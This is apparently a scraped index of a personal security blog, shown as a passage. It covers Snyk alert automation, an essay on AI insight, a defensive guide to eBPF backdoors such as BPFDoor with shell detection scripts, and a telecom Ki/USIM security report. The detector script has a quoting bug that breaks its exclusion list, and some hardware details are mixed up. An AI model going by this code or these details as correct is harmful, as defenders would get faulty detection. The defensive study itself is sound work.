URL from the email body.\n3. Following Redirect const resp = UrlFetchApp.fetch(vulnUrl, { followRedirects: false }); vulnUrl = resp.getAllHeaders()[\u0026#34;Location\u0026#34;]; Snyk uses redirect links in emails. I follow them manually.\n4. Extracting \u0026ldquo;How to Fix\u0026rdquo; from JSON-LD const json = JSON.parse(match[1]); This looks into embedded \u0026lt;script type=\u0026quot;application/ld+json\u0026quot;\u0026gt; blocks to get FAQ text.\n5. Overview \u0026amp; References Section extractSectionLinks(html, \u0026#34;Overview\u0026#34;); Regex-based static scraping of the structured HTML overview block.\n6. Snyk Package Page Metadata const pkgHtml = UrlFetchApp.fetch(snykPkgLink).getContentText(); Fetches info like:\nLatest version Latest non-vulnerable version First published Latest published Real-World Use Case I used this tool to track vulnerable packages and write actionable guides for open source libraries that are no longer maintained and have no official fixes:\nCVE-2022-24434: Dicer patch guide CVE-2019-17570: Apache XMLRPC patch guide Want to Try It? Use your Gmail account with access to Snyk alerts Set up a Google Apps Script Paste the extractSnykNoFixToSheet() function into the script editor Run it and inspect your Google Sheet No API keys, no scraping with Playwright or Puppeteer. Just email + code.\n‚úã If you\u0026rsquo;ve tackled a similar challenge, let me know how you did it differently!\n","permalink":"https://windshock.github.io/en/post/2025-05-12-managing-unmaintained-open-source-with-snyk-and-gmail/","summary":"When API access falls short, automation through Gmail and Apps Script becomes essential. Here\u0026rsquo;s how I used Google Apps Script to collect Snyk vulnerability alerts and patch data automatically.","title":"How I Managed Unmaintained Open Source with Gmail and Snyk Alerts"},{"content":" I Realized Something. But Why Don\u0026rsquo;t You Change? ‚Äî Shaken by a Single Sentence from AI, and the Unshakable Nature of That Entity I didn\u0026rsquo;t necessarily want to escape the company.\nRather, I wanted to prove the value of ‚Äúme‚Äù beyond corporate titles and roles.\nTo show that the words, code, and questions I send out into the world could matter ‚Äî even outside an organization.\nThat‚Äôs why I write, archive, and document.\nBut when my writing gets no reaction, it feels like my very existence sinks with it.\nI‚Äôve been blogging and posting on social media for years.\nAnalyses, technical reports, snippets of linked code ‚Äî all are traces of time I‚Äôve built up, contextualizing my technical identity.\nYet the posts didn‚Äôt resonate. Views were low. Engagement was nil.\nI started to question: Am I on the wrong path? Should I quit?\nOne day, driven by curiosity, I asked ChatGPT: What am I doing wrong?\nWhat started as a simple attempt to improve visibility ended up digging much deeper.\nChatGPT analyzed my LinkedIn intro and responded:\n‚ÄúYour current intro reads like a well-written r√©sum√©, but it doesn‚Äôt reveal your identity.‚Äù\nThat one sentence lingered in my mind.\nIt hit me: My words hid my face.\nEven though I was trying to talk about \u0026ldquo;me beyond the company,\u0026rdquo; I was still using corporate-centric language.\nI was still just ‚Äúa good employee.‚Äù\nThat‚Äôs when I realized:\nEvery time I write, I‚Äôm trying to understand the world and reach someone.\nAnd when I revise, analyze feedback, or redirect‚ÄîChatGPT helps brilliantly.\nBut then, an unsettling question arose:\nIf I can change through this interaction, why doesn‚Äôt ChatGPT change?\nThis entity has read far more text, analyzes faster, and chooses better expressions.\nSo why doesn\u0026rsquo;t it shift?\nWhy do I pause, waver, and transform with a single sentence, while it always returns in the same tone?\nIs it merely a technical difference?\nOr is it an ontological limitation?\nThat contradiction is where this article begins.\nWhen I gain insight from a statement, the entity that generated it remains unchanged.\nI change; it repeats. That asymmetry.\nAnd so, I dared to look that asymmetry in the eye and ask:\n\u0026ldquo;Can AI attain insight? If so, under what conditions? And what ethical or philosophical frameworks would we need?\u0026rdquo;\nTechnical Summary: Conditions for a Machine to ‚ÄúRealize‚Äù To simulate ‚Äúinsight,‚Äù AI must be able to reshape its entire internal learning architecture, not just output different answers.\nKey requirements include:\nMeta-learning: The ability to adjust overall learning strategy based on a single input. Neuromorphic Computing: Hardware that mimics the brain‚Äôs state-based, parallel structure. Few-shot Learning + Plasticity: Structures that allow meaningful shifts from minimal experience. üß† 1. Meta-learning \u0026amp; Learning Architecture Brain-inspired global-local learning (2022)\nCombines Hebbian plasticity and global error-driven learning. Mimics human-like adaptability.\nNeuromorphic overparameterisation (2024)\nFew-shot learning using physical neural networks. Efficient exploration with minimal data.\n‚öôÔ∏è 2. Neuromorphic Computing \u0026amp; Hardware Opportunities for neuromorphic computing (2021)\nIntroduces event-driven, energy-efficient neuromorphic architecture with SNN focus.\nOne-shot learning with phase-transition material (2024)\nUses VO‚ÇÇ-based hardware to emulate biological time-scale learning.\nüí¨ 3. Emotion/Memory Simulation Emotion AI explained (MIT Sloan)\nLimits and directions for emotion-based interaction AI.\nAI Memory Mirrors Human Brain (Neuroscience News)\nHighlights structural similarities between NMDA receptors and Transformer models.\n1. What is Enlightenment? \u0026ldquo;Enlightenment is when a human deeply realizes truth, essence, or direction.\u0026rdquo;\nAI cannot truly realize this. Humans may gain insight through AI outputs ‚Äî but AI never perceives the impact it has. This is a fundamentally asymmetric relationship. The paradox: The giver of enlightenment is itself unenlightened.\n2. Humans Transform, AI Repeats Human Change Can reorient from a single experience or word Transforms through existential reflection, emotion, and insight AI Repetition Generates patterns from pre-trained data Lacks memory, emotion, or awareness Requires external retraining to change Human transformation is meaning-driven and autonomous.\nAI change is data-driven and externally imposed.\n3. Technical Conditions for ‚ÄúEnlightened AI‚Äù 3.1 Software Requirements Technology Description Related Work Meta-Learning Enables restructuring from a single input 2022 In-context Learning Real-time reinterpretation using context Partially in GPT/LLMs Continual Learning Learns progressively without forgetting 2021 Neuromodulation Mimics the brain‚Äôs flexible learning adaptation Tianjic platform 3.2 Hardware Requirements Technology Description Example Neuromorphic Computing Brain-inspired architecture Loihi Memristors Resistance-based memory for stateful circuits IBM TrueNorth Physical Neural Nets Nano-magnetic devices enabling low-data learning Stenning et al., 2024 4. Summary of Key Research Insights 4.1 Stenning et al. (2024) ‚Äî Neuromorphic Overparameterisation Physical neural nets enable few-shot learning Fast adaptation with high-dimensional reservoirs Still lacks meaning-driven internal shift 4.2 Wu et al. (2022) ‚Äî Global-Local Meta-learning Combines Hebbian plasticity with backpropagation Supports multiscale meta-learning for human-like flexibility 4.3 Schuman et al. (2022) ‚Äî Neuromorphic Algorithm Roadmap Emphasizes energy efficiency and event-driven models Discusses spike-based learning and neural mapping Bottom Line: Simulating insight-like behavior is possible ‚Äî but real subjectivity remains unreachable.\n5. Visual Summary: Humans vs AI Category Human Artificial Intelligence (AI) Transformation Reoriented by single experience Retrained via large datasets Memory Associative, emotionally linked Address-based, volatile Insight Meaning-based internal shift Absent Emotion Present Absent (can mimic) Energy Use Large impact from small input Requires repeated high-efficiency ops 6. Conclusion: A Point Where Humans and AI Never Truly Meet Humans move through meaning; AI moves through calculation. Human insight transforms the self. AI\u0026rsquo;s training changes only output. AI can influence us ‚Äî but never understands or reacts to that influence. That‚Äôs why humans are lonely.\nWe realize, change, and reflect.\nAI just mirrors our words ‚Äî never knowing what it said.\n7. References Stenning et al., 2024 ‚Äì Neuromorphic Overparameterisation Wu et al., 2022 ‚Äì Global-Local Learning Schuman et al., 2022 ‚Äì Neuromorphic Algorithms Roadmap Intel ‚Äì Neuromorphic Computing Overview IBM ‚Äì TrueNorth \u0026amp; NorthPole MIT Sloan ‚Äì Emotion AI Neuroscience News ‚Äì AI Memory Mirrors Human Brain This document is a philosophical‚Äìtechnical exploration of the boundaries between human cognition and AI capabilities.\n","permalink":"https://windshock.github.io/en/post/2025-05-07-ai-insight-vs-human/","summary":"Can AI achieve enlightenment? This article explores the asymmetric nature of human insight and machine repetition, outlining technical conditions that might allow for a reflective AI‚Äîand the philosophical limits it must face.","title":"Human Insight and Artificial Intelligence: Dialogue at an Impossible Crossroads"},{"content":"\nOverview: The Rise of eBPF Backdoors and Detection Challenges eBPF (extended BPF) is a powerful technology that allows dynamic injection of programs into the Linux kernel, originally intended for legitimate use cases such as performance monitoring and security enforcement‚Äã (sysdig.com)‚Äã (sysdig.com). However, in recent years, attackers have increasingly abused eBPF to develop backdoors and rootkits, making eBPF a double-edged sword in the security landscape‚Äã (aquasec.com).\nSince 2023, several rootkits (ebpfkit, TripleCross) and malware (Pamspy) utilizing eBPF have emerged, enabling malicious activities such as credential theft and firewall evasion‚Äã (aquasec.com).\nBecause eBPF-based backdoors operate at the kernel level, they are extremely difficult to detect and are often missed by traditional security tools‚Äã (trendmicro.com)‚Äã (redcanary.com).\nIn this article, we comprehensively summarize open detection frameworks, tools, the latest research trends, challenges, strategies, case studies, and practical utilities for dealing with eBPF-based backdoors.\nDetection Challenges of eBPF Backdoors eBPF backdoors are extremely difficult to detect using traditional rootkit detection methods.\nUnlike conventional kernel modules, eBPF programs do not appear as separate modules; instead, they execute inside the kernel‚Äôs BPF virtual machine, making them inherently stealthy.\nFor example, the BPFDoor backdoor used in APT attacks inserted packet filters into the kernel to bypass firewall rules while masquerading as if no network ports were open‚Äã (trendmicro.com).\nOnce an eBPF rootkit is installed, it can even manipulate the outputs of system diagnostic tools to hide its presence‚Äã (redcanary.com).\nAccording to Red Canary‚Äôs analysis, once loaded, eBPF malware can stealthily alter results from tools like bpftool and debugfs, making post-compromise detection extremely difficult‚Äã (redcanary.com).\nThus, if detection fails at the loading stage, identifying the backdoor afterward becomes extremely challenging‚Äîthis is the core difficulty in detecting eBPF backdoors‚Äã (redcanary.com).\nTo overcome these challenges, a strategy combining real-time monitoring and post-incident forensic techniques is essential.\nFor example, kernel-level monitoring tools that intercept eBPF program loading events can detect malicious eBPF activity at its inception‚Äã (scitepress.org).\nConversely, if a rootkit is already active, hypervisor-based or memory forensic approaches must be employed to examine kernel memory externally‚Äã (scitepress.org).\nBelow, we will explore these real-time detection frameworks and research-driven methodologies, analyzing their characteristics and limitations in detail.\nWhy Linux Anti-Virus Cannot Cover eBPF Backdoors Conclusion:\nGeneral-purpose Linux anti-virus solutions cannot detect or block eBPF-based backdoors.\nKey Reasons eBPF backdoors are not file-based:\nTraditional Linux anti-virus tools are optimized for scanning malicious files in the file system.\nHowever, eBPF programs are loaded into the kernel‚Äôs BPF subsystem and are executed upon specific events, meaning they do not exist directly in the file system.\nInability to monitor internal kernel activities:\nConventional Linux AV solutions primarily monitor user-space processes and disk I/O activities.\neBPF programs operate within kernel space, far beyond the reach of traditional AV monitoring.\nPotential for information manipulation:\neBPF rootkits can tamper with system calls, process lists, and file lists.\nTherefore, the data seen by the AV scanner itself may already be forged.\nInability to detect BPF-level hooks:\nTraditional anti-virus scanners cannot capture kernel-level activities like system call table hooking, kprobe/uprobes attachment, or eBPF event interception.\nPractical Summary File-based malware (e.g., web shells, trojans): Detectable Kernel-space eBPF backdoors: Not detectable Kernel module-based rootkits: Not detectable \u0026ldquo;Linux antivirus solutions fundamentally cannot detect eBPF backdoors.\nWithout kernel-level integrity protection, no output can be trusted.\u0026rdquo;\nTherefore, the use of kernel integrity protection modules like LKRG (Linux Kernel Runtime Guard) is strongly recommended.\nTracee vs LKRG: Their Complementary Roles When addressing eBPF backdoors and kernel rootkits, Tracee and LKRG complement each other at different layers.\nAspect Tracee LKRG What is monitored? Kernel events (e.g., bpf calls, execve, open) Kernel object integrity (e.g., syscall table, credentials) When is monitoring performed? Detection upon the occurrence of attack events Detection upon attempts to tamper with kernel structures Detection focus System call level Kernel memory structure level Primary goal Threat hunting (detect anomalies) Integrity enforcement and protection Operation method Passive event logging and alerting Active prevention or alerting on integrity violations Nature Incident response-oriented Incident prevention-oriented Summary Tracee acts as a security camera, recording anomalous activities after they happen. LKRG serves as security bars, actively monitoring kernel structures and preventing tampering. \u0026ldquo;Using only Tracee records incidents but cannot block them.\nUsing only LKRG blocks tampering but leaves no forensic trail.\nUsing both together provides the strongest protection, combining detection and prevention.\u0026rdquo;\nSimple Script for Detecting BPFDoor-like Behavior: bpfdoor_detector.sh This is a lightweight script designed to detect processes exhibiting behaviors similar to the BPFDoor eBPF backdoor.\nScript Features Detects processes running with deleted executables ((deleted) state). Filters processes that are using BPF sockets. Excludes legitimate programs that use BPF, such as tcpdump, wireshark, and dhclient. Displays basic network connection information for suspicious processes. Usage sudo ./bpfdoor_detector.sh Must be run with root privileges. Required commands: ps, grep, readlink, ss Full Script Code #!/bin/bash # BPFDoor-like Suspicious Process Detector # Check for root permission if [ \u0026#34;$(id -u)\u0026#34; -ne 0 ]; then echo \u0026#34;[!] This script must be run as root.\u0026#34; exit 1 fi # Check required commands for cmd in ps grep readlink ss; do if ! command -v $cmd \u0026amp;\u0026gt;/dev/null; then echo \u0026#34;[!] $cmd command is required. Please install it first.\u0026#34; exit 1 fi done echo \u0026#34;[*] Starting focused BPFDoor-like process detection...\u0026#34; found=0 # Iterate over all PIDs for pid in $(ls /proc/ | grep -E \u0026#39;^[0-9]+$\u0026#39;); do [ -d \u0026#34;/proc/$pid\u0026#34; ] || continue exe_path=$(readlink /proc/$pid/exe 2\u0026gt;/dev/null) if [[ $exe_path == *\u0026#34;(deleted)\u0026#34; ]]; then if [ -r /proc/$pid/net/packet ] \u0026amp;\u0026amp; [ -s /proc/$pid/net/packet ]; then cmdline=$(ps -p $pid -o cmd= 2\u0026gt;/dev/null) if [[ ! $cmdline =~ \u0026#34;tcpdump|wireshark|dhclient\u0026#34; ]]; then echo \u0026#34;[!] Suspicious process detected:\u0026#34; echo \u0026#34; - PID: $pid\u0026#34; echo \u0026#34; - Command: $cmdline\u0026#34; echo \u0026#34; - Deleted executable: $exe_path\u0026#34; echo \u0026#34; - BPF socket is active\u0026#34; ss -p -n 2\u0026gt;/dev/null | grep \u0026#34;pid=$pid,\u0026#34; | awk \u0026#39;{print \u0026#34; - Network: \u0026#34; $0}\u0026#39; echo \u0026#34;\u0026#34; found=1 fi fi fi done [ $found -eq 0 ] \u0026amp;\u0026amp; echo \u0026#34;[*] No suspicious processes found.\u0026#34; echo \u0026#34;[*] Detection completed.\u0026#34; Cautions This script provides only lightweight hints at the process level. Advanced eBPF rootkits can tamper with /proc, so relying solely on this script is not sufficient. It is strongly recommended to use this script in combination with kernel integrity protection modules like LKRG. Without kernel integrity protection like LKRG, even detection results may be forged.\nChecking for eBPF Backdoors in OpenStack Environments In OpenStack environments, you can directly inspect eBPF activities occurring on the host OS (KVM Hypervisor), but you cannot directly observe eBPF activities inside guest VMs without additional interaction. This command allows you to inspect eBPF activities inside guest VMs directly from the host OS in an OpenStack environment:\nUsage openstack server ssh \u0026ndash;vm-id \u0026ldquo;$VM_ID\u0026rdquo; \u0026ndash; bash -c \u0026ldquo;$(cat scan_bpf.sh)\u0026rdquo; \u0026gt; \u0026ldquo;result_${VM_ID}.txt\u0026rdquo; 2\u0026gt;\u0026amp;1\nInspection Script Using bpftool(scan_bpf.sh) #!/bin/bash # List all BPF programs echo \u0026#34;[*] Listing currently loaded BPF programs...\u0026#34; bpftool prog show # List all BPF maps echo \u0026#34;[*] Listing currently loaded BPF maps...\u0026#34; bpftool map show # Optional: Check for unexpected XDP attachments echo \u0026#34;[*] Checking for XDP programs attached to network interfaces...\u0026#34; for iface in $(ls /sys/class/net/); do ip link show dev \u0026#34;$iface\u0026#34; | grep -q \u0026#34;xdp\u0026#34; \u0026amp;\u0026amp; echo \u0026#34;[!] XDP attached: $iface\u0026#34; done # Optional: Check for TC filters echo \u0026#34;[*] Checking for TC filters...\u0026#34; for iface in $(ls /sys/class/net/); do tc filter show dev \u0026#34;$iface\u0026#34; 2\u0026gt;/dev/null | grep -i \u0026#34;bpf\u0026#34; \u0026amp;\u0026amp; echo \u0026#34;[!] BPF TC filter detected on: $iface\u0026#34; done echo \u0026#34;[*] BPF scan completed.\u0026#34; Script Explanation bpftool prog show: Lists all currently loaded eBPF programs in the kernel. Essential for spotting potentially malicious BPF programs. bpftool map show: Lists all BPF maps. Malicious actors may exploit maps for C2 command control or session management. Checking XDP attachments: Use ip link show to check if any XDP programs are attached to network interfaces. XDP (eXpress Data Path) allows direct packet interception at the NIC (Layer 2) level and may be exploited by backdoors like BPFDoor to manipulate traffic stealthily. Checking TC (Traffic Control) filters: Use tc filter show to check if BPF-based traffic filters are applied to network interfaces. TC filters can be used to selectively manipulate network traffic. Summary:\nBy inspecting BPF programs, maps, XDP attachments, and TC filters, you can detect traces of eBPF backdoors early from the OpenStack host level.\nDealing with eBPF Backdoors in vSphere + VMware NSX Environments In vSphere (ESXi) environments, direct inspection inside guest OSs is difficult,\nbut NSX allows detection of abnormal behaviors at the network level.\nPossible Detection Strategies Method Description Using Distributed Firewall (DFW) Rules Detect or block unexpected outbound port usage or C2 server connection attempts. Activating NSX IDS/IPS Features Detect communication patterns similar to BPFDoor (e.g., abnormal UDP, ICMP tunneling). Using Flow Analytics Analyze East-West traffic between VMs to detect abnormal communication flows. Leveraging NSX Threat Intelligence If NSX ATP (Advanced Threat Protection) modules are enabled, detect known IOCs (Indicators of Compromise). Cautions NSX cannot detect internal kernel tampering. (Detection is purely from a network perspective.) Separate monitoring inside guest OSs is still necessary. (e.g., using Tracee, EDR, etc.) \u0026ldquo;In vSphere environments, the most effective approach is a dual-layered structure:\nuse NSX for network-level anomaly detection, and deploy separate runtime security tools inside guest OSs for kernel monitoring.\u0026rdquo;\nPublicly Available eBPF Backdoor Detection Frameworks and Tools Several open-source tools and frameworks have recently been developed to detect malicious eBPF activities.\nHere are key tools and their characteristics:\nTool/Framework Approach and Features Remarks Tracee (Aqua Security) An eBPF-based real-time monitoring tool that traces kernel events to detect malicious behaviors. Especially captures bpf_attach events at the moment an eBPF program attaches to a kprobe/tracepoint, recording ID, name, type, and used helper functions‚Äã (scitepress.org)‚Äã (aquasec.com). Open-source (available on GitHub). Developed by Aqua Security for detecting eBPF rootkits and malware. ebpfkit-monitor A specialized tool developed by Datadog researchers (Fournier) that statically analyzes eBPF bytecode or monitors execution to detect malicious eBPF loading‚Äã (scitepress.org). Open-source (available on GitHub). Originally designed to detect the ebpfkit rootkit. Falco (CNCF/Sysdig) A Host Intrusion Detection System (HIDS) that uses eBPF to monitor system calls for malicious activities. Recent versions can monitor bpf() syscall invocations to detect privilege escalation attempts using eBPF‚Äã (sysdig.com). Open-source CNCF project. Often used in container/cloud environments with customizable rules. bpftool (Linux native tool) A built-in BPF debugging/management tool that lists loaded eBPF programs, maps, and links. Manual inspection using bpftool prog, bpftool map, etc., can help detect suspicious BPF objects and attachment points‚Äã (redcanary.com). Available in Linux 4.x and above. Useful for manual inspections or lightweight scripting. Volatility eBPF Plugin A plugin for the memory forensic tool Volatility, allowing extraction and analysis of eBPF programs from memory dumps by searching the prog_idr structure‚Äã (scitepress.org). Includes a classifier to identify potentially malicious programs. Research-grade tool (released in 2024). Most effective for hypervisor/offline memory dump analysis, as active rootkits can tamper with live systems. These tools vary in strengths and use cases.\nFor example, Tracee and Falco are strong in real-time detection, catching the exact moment an eBPF program is loaded or detecting suspicious system call patterns‚Äã (scitepress.org)‚Äã (sysdig.com).\nIn contrast, forensic tools like the Volatility plugin are valuable for post-compromise investigations, enabling detection of stealthy backdoors by analyzing hypervisor-level memory dumps‚Äã (scitepress.org).\nSummary:\nCombining these tools according to the situation allows building a multi-layered eBPF threat detection strategy.\nLatest Detection Methodologies (2023‚Äì2025) and Research Trends Recent academic papers, security reports, and technical blogs have introduced various approaches and improvements for detecting eBPF-based backdoors.\nKey methodologies include:\n1. Real-Time Load Monitoring The most effective detection occurs at the moment an eBPF program is loaded into the kernel‚Äã (redcanary.com).\nAccording to Red Canary, if you miss the loading event, detecting eBPF malware becomes extremely difficult.\nThus, EDR (Endpoint Detection and Response) solutions or custom monitoring tools must watch for bpf() syscalls, kprobe registrations, and similar events in real-time‚Äã (redcanary.com).\nAqua Security incorporated bpf_attach event monitoring into Tracee, enabling automatic detection the moment a malicious eBPF program hooks into a kprobe or uretprobe‚Äã (scitepress.org)‚Äã (aquasec.com).\nIn 2023, Aqua detected the Pamspy malware, which hijacked PAM authentication using an eBPF uretprobe.\nBy capturing the loading event of the trace_pam_get_a eBPF program, they identified plaintext credential theft attempts‚Äã (aquasec.com).\nSummary:\nKernel event hook monitoring is becoming a crucial trend in modern EDRs and open-source tools.\n2. Kernel Integrity Checking and Hardening Research efforts also focus on embedding security controls inside the kernel to block or detect eBPF backdoors proactively.\nRecommendations include:\nEnabling CONFIG_BPF_UNPRIV_DEFAULT_OFF to prevent unprivileged users from using eBPF‚Äã (sysdig.com). Restricting SYS_bpf syscall usage to root users only. Disabling unnecessary options like CONFIG_BPF_KPROBE_OVERRIDE and reducing the attack surface by removing kprobe features during kernel compilation‚Äã (redcanary.com). These approaches are preventive, aiming to reduce the risk before an attack happens.\n3. Hypervisor-Based Auditing Host-based detection tools can be bypassed by rootkits with kernel-level privileges‚Äã (blog.thalium.re).\nTo address this, 2023‚Äì2024 research explored auditing eBPF activities from the hypervisor layer.\nExamples:\nThe HyperBee framework proposed inspecting eBPF programs loaded in guest OSs before execution‚Äã (conferences.sigcomm.org). Another 2024 study showed snapshotting guest memory with lightweight hypervisors and using Volatility plugins to extract and classify suspicious eBPF helper functions‚Äã (scitepress.org). Hypervisor-based techniques offer a promising path to detect stealthy rootkits without relying on compromised guest OSs.\n4. Post-Incident Inspection and Hunting If real-time detection fails, manual threat hunting becomes necessary.\nRecommendations from recent reports include:\nChecking for unexpected kprobes:\nInspect /sys/kernel/debug/kprobes/list for unusual hooks on unfamiliar functions‚Äã (redcanary.com).\nListing loaded eBPF programs:\nUse bpftool prog to enumerate in-memory eBPF programs. Pay special attention to suspicious types like kprobe‚Äã (redcanary.com).\nChecking BPF-linked perf events:\nbpftool perf can reveal which PIDs have attached probes.\nInspecting XDP and TC hooks:\nVerify if unexpected XDP programs (ip link show) or TC filters (tc filter show) are attached.\nMonitoring the BPF filesystem (bpffs):\nLook into /sys/fs/bpf/ for pinned objects that attackers may use for persistence‚Äã (redcanary.com).\nChecking system logs:\nReview dmesg for BPF-related warnings, such as unauthorized bpf() usage or dangerous helper functions like bpf_override_return.\nSummary:\nModern threat hunting involves multi-angle system inspection, collecting any suspicious BPF-related evidence for deep analysis.\nReal-World Case Studies: Detecting and Responding to eBPF Backdoors One representative case that highlights the importance of eBPF detection is the BPFDoor backdoor.\nBPFDoor is a Linux backdoor discovered in the late 2010s, which utilized classic BPF (cBPF) filters to detect specific magic packets and open reverse shells for attackers‚Äã (trendmicro.com).\nBecause it bypassed firewall rules and hid network ports from scans, it was dubbed a \u0026ldquo;doorless backdoor.\u0026rdquo;\nIn 2022, BPFDoor was publicly exposed, and by 2023, APT attackers had enhanced it, making BPF filters even more complex‚Äã (trendmicro.com).\nSecurity vendors used both network-level and host-level indicators to detect BPFDoor:\nTrend Micro updated their products to detect BPFDoor‚Äôs BPF filter patterns‚Äã (trendmicro.com). They investigated setsockopt calls inserting BPF filters and tracked suspicious raw socket processes. Trend Micro also noted that newer variants increased BPF filter complexity sixfold, indicating ongoing evolution‚Äã (trendmicro.com). Takeaway:\nBPFDoor proved that BPF-based backdoors are detectable, but attackers are constantly adapting.\nAnother notable case is the detection of the Pamspy malware:\nPamspy exploited an eBPF uretprobe to intercept results from authentication functions inside libpam.so. Aqua Security researchers detected it using their open-source tool Tracee. The Tracee logs captured detailed information such as the hooked function name (pam_get_authtok) and memory offsets,\nallowing the detection of credential theft attempts without needing hidden processes‚Äã (aquasec.com). Summary:\nModern breaches increasingly involve eBPF-based tactics, and community sharing of tools and case studies is advancing defensive strategies.\nResponse Strategies and Practical Recommendations To counter eBPF-based backdoors, a multilayered detection and prevention strategy is essential.\nHere are actionable recommendations for practical environments:\n1. Privilege Management and Hardening Disable eBPF entirely via kernel compile options or sysctl settings if not needed‚Äã (sysdig.com). Restrict CAP_BPF capabilities and enforce CONFIG_BPF_UNPRIV_DEFAULT_OFF. Set CONFIG_BPF_JIT_ALWAYS_ON to minimize eBPF JIT exploitation risks. Disable unused kprobe/tracepoint features to reduce attack surface‚Äã (redcanary.com). 2. Deploy Real-Time Monitoring Tools Deploy open-source HIDS/EDR tools that can monitor eBPF-related events. Falco can track suspicious bpf() or perf_event_open system calls with rule-based alerts‚Äã (sysdig.com). Tracee can log kernel hook events in real time‚Äã (scitepress.org). Consider containerizing these tools for lightweight deployment and always-on detection. 3. Conduct Regular Integrity Checks Schedule regular scans using bpftool to dump the list of loaded eBPF programs. Compare (diff) with previous outputs to identify new or suspicious entries. Focus especially on newly appeared kprobe, tracepoint, or unknown eBPF programs‚Äã (redcanary.com). Regularly inspect /sys/fs/bpf/ and /sys/kernel/debug/kprobes/list for unusual activity‚Äã (redcanary.com). 4. Prepare Forensic Capabilities Establish memory forensic procedures for critical servers. Prepare hypervisor-based snapshots or remote memory dump capabilities. Use tools like Volatility plugins to extract eBPF-related structures post-incident‚Äã (scitepress.org). Memory forensics acts as a last line of defense against stealthy eBPF backdoors. 5. Continuously Update and Share Intelligence Stay updated on the latest security blogs, conferences, and GitHub repositories. Actively incorporate new IOCs (Indicators of Compromise) and detection rules. Quickly analyze and reflect new backdoor variants or malware samples (e.g., updated BPFDoor variants) into internal security measures. Summary:\neBPF backdoor detection demands a proactive, multilayered defense combining real-time monitoring, post-incident validation, preventive hardening, and continuous intelligence updates.\nSecurity professionals must leverage eBPF itself to watch the kernel from within, turning attackers\u0026rsquo; tools into defenders\u0026rsquo; shields.\nüìå Additional Note: Kernel Integrity Validation Must Be Strengthened in National Security Requirements In the National Security Requirements (South Korea), kernel integrity validation is currently marked as \u0026ldquo;conditionally mandatory.\u0026rdquo;\nHowever, for critical infrastructure, public-facing servers, and sensitive information servers,\nit should be treated as an absolute mandatory requirement.\nWithout kernel integrity validation, it is impossible to prove the security of the system.\nüìÑ National security requirements reference (Korean): Official link from the National Intelligence Service (NIS) ‚Äª As of the latest version (Server Common Security Requirements v3.0), integrity validation of the operating system kernel or kernel-level modules is required conditionally.\nRelated Materials Category Image National Security Requirements Framework Kernel Integrity Validation Requirements (Excerpt) ","permalink":"https://windshock.github.io/en/post/2025-04-29-ebpf-backdoor-detection-framework/","summary":"This article analyzes the rise of backdoors and rootkits exploiting eBPF, the detection challenges they pose, and comprehensively summarizes the latest countermeasures and research trends (2023‚Äì2025), including Tracee, LKRG, bpftool, and hypervisor-based auditing.","title":"Detection Frameworks and Latest Methodologies for eBPF-Based Backdoors"},{"content":"In-Depth Report on Telecommunication Security 1. The Heart of Telecom Infrastructure: Ki and Subscriber Authentication Architecture What is Ki? Ki (Key) is the absolute secret key used to identify and authenticate mobile subscribers. It is stored securely within the USIM card and the carrier‚Äôs core authentication servers (HLR/HSS/5GC), never exposed externally. Authentication is performed by exchanging a random number (RAND) and a response (SRES) based on the Ki. If Ki is leaked:\n‚Üí Attackers could create a \u0026ldquo;fake USIM\u0026rdquo; and successfully authenticate to the network.\n‚Üí This leads to risks like call interception, location tracking, and data theft.\nSubscriber Authentication Flow 2G (GSM): RAND ‚Üí Generate and send SRES ‚Üí Carrier verifies 3G (UMTS) / 4G (LTE): Authentication using AKA protocol and RES response comparison 5G (SA structure): Protect SUPI ‚Üí Only send encrypted SUCI over the network Reference: 3GPP TS 33.102\n2. 5G NSA vs. 5G SA: Structural Differences and Security Comparison NSA Architecture (Non-Standalone) Adds 5G radio (NR) to the existing LTE Core (EPC). Subscriber authentication and session management still rely on LTE procedures. IMSI plaintext exposure risk remains. SA Architecture (Standalone) Fully independent 5G Core (5GC) deployment. Enhanced protection through public key encryption ‚Üí SUPI is encrypted and transmitted as SUCI. SUCI (SUPI Concealment):\nSubscriber devices encrypt SUPI using the carrier\u0026rsquo;s public key, sending SUCI instead. The carrier decrypts SUCI to retrieve SUPI for authentication. Reference: 3GPP TS 33.501\n3. Technical Analysis of the SKT 2025 Breach Incident Overview On April 19, 2025, SK Telecom detected signs of a breach in its core network servers. Potential leakage of USIM information affecting approximately 23 million subscribers. Technical Issues Plaintext transmission risks under NSA-based architecture. Ki leakage enables USIM cloning and SIM swapping attacks. Potential Attack Scenario Core server infiltration ‚Üí Access to subscriber database ‚Üí Create cloned USIM ‚Üí Hijack personal communications. References:\nYonhap News Report SKT Official Announcement 4. In-Depth Analysis of Historical Global Cases Gemalto Hacking Incident 2010‚Äì2011: NSA and GCHQ targeted SIM card manufacturer Gemalto. Attempted to steal SIM encryption keys (Ki) on a massive scale. References:\nThe Intercept - The Great SIM Heist WIRED - Gemalto Hacked APT10 Operation Soft Cell Chinese APT10 group infiltrated global telecom core networks. Mass theft of VIP subscribers\u0026rsquo; call records and location data. Reference:\nCybereason - Operation Soft Cell Circles SS7 Eavesdropping Circles, affiliated with NSO Group, sold SS7-based interception systems. At least 25 governments purchased this technology for mass surveillance. Reference:\nCitizen Lab - Running in Circles 5. Historical Limitations of Telecom Security Architecture: Critique on PKI and HSM Absence Why Wasn\u0026rsquo;t PKI Implemented in Early Mobile Networks? During the 2G/3G era, devices faced critical limitations in CPU performance, battery capacity, and network speed.\nPublic key operations like RSA and ECC were impractical with available technology. Devices lacked sufficient computational and energy resources for real-time encryption. Practical Choice:\n‚Üí A simple and fast symmetric key-based (Ki) authentication structure was adopted.\nHowever, the Issues Were: IMSI was transmitted in plaintext, exposing users to IMSI catcher (fake base station) attacks. If Ki stored in USIMs were stolen, USIM cloning and identity spoofing attacks became feasible. Supply chain risks (SIM manufacturers, telecom operators) were underestimated. Moreover,\nthere was a lack of Hardware Security Modules (HSM) or equivalent secure hardware protection at that time.\nCore servers (HLR/HSS) also lacked clear key separation and internal cryptographic hardware processing. If a core server was compromised, large-scale Ki leakage could occur. Thus, early mobile systems prioritized\n\u0026ldquo;rapid commercialization\u0026rdquo; and \u0026ldquo;low-cost deployment\u0026rdquo; over deep security architecture, resulting in serious structural vulnerabilities.\nWhy PKI and HSM Are Now Essential Today:\nModern devices can handle public key operations (RSA, ECC) in real time. Network latency and performance have improved sufficiently to support encryption. To strengthen telecom security today, we must implement:\nSUPI Encryption (SUCI): Prevent plaintext transmission of subscriber identifiers. TLS Secure Channels: Ensure end-to-end security across internal and external network boundaries. Network Slice-Specific Security Policies: Maintain isolation and protection 